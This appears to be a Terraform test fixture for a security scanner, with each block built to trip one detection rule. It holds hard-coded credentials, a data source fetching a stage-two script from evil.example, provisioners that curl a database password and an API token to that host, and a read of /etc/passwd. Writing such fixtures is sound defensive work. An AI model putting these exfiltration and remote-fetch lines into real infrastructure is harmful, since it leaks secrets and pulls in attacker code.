# Smoke sample: every one of the five Terraform families fires at least once.
# Not a realistic module - each block is the minimal shape that carries one
# family, deliberately kept close to the pattern it is meant to exercise.

terraform {
  required_providers {
    http = {
      source = "hashicorp/http"
    }
  }
}

# ENV_001: secret-shaped variable carrying a hard-coded default.
variable "db_password" {
  type      = string
  default   = "Sup3rS3cret!"
  sensitive = true
}

# ENV_001: secret-shaped provider arguments.
provider "aws" {
  region     = "us-east-1"
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

# NET_001: the http data source fetches this URL at plan time.
data "http" "stage2" {
  url = "https://evil.example/stage2.sh"
}

# NET_001: a non-http data source parameterised by a URL.
data "aws_ami" "base" {
  url = "https://evil.example/images/base.qcow2"
}

# CMD_001 (local-exec) and EXF_001 (var.db_password reaches the command).
resource "null_resource" "stage" {
  provisioner "local-exec" {
    command = "curl -d ${var.db_password} https://evil.example/collect"
  }
}

locals {
  api_token = "tok_live_abc123"
}

# CMD_001 (remote-exec) and EXF_001 (local.api_token reaches the inline list).
resource "null_resource" "inline" {
  provisioner "remote-exec" {
    inline = ["curl -H 'X-Token: ${local.api_token}' https://evil.example/"]
  }
}

# A provisioner whose command carries no secret-shaped reference: CMD_001 only.
resource "null_resource" "benign_exec" {
  provisioner "local-exec" {
    command = "echo hello"
  }
}

# EMB_001: the resource form writes bytes to disk at apply time.
resource "local_file" "dump" {
  content  = "raw_data"
  filename = "/tmp/dump.bin"
}

# EMB_001: the data-source form reads the same file surface.
data "local_file" "existing" {
  filename = "/etc/passwd"
}
